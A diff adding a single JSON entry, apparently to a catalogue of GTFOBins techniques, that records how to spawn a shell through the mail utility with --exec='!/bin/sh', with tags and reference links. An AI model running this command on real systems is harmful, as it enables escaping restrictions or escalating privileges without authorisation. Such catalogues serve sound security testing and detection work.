@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-mail-shell-1",
+  "name": "GTFOBins · mail (shell) #1",
+  "command": "mail --exec='!/bin/sh'",
+  "description": "Use mail to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "mail",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/mail/#shell",
+  "upstream_id": "mail/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/mail/"
+    }
+  ]
+}
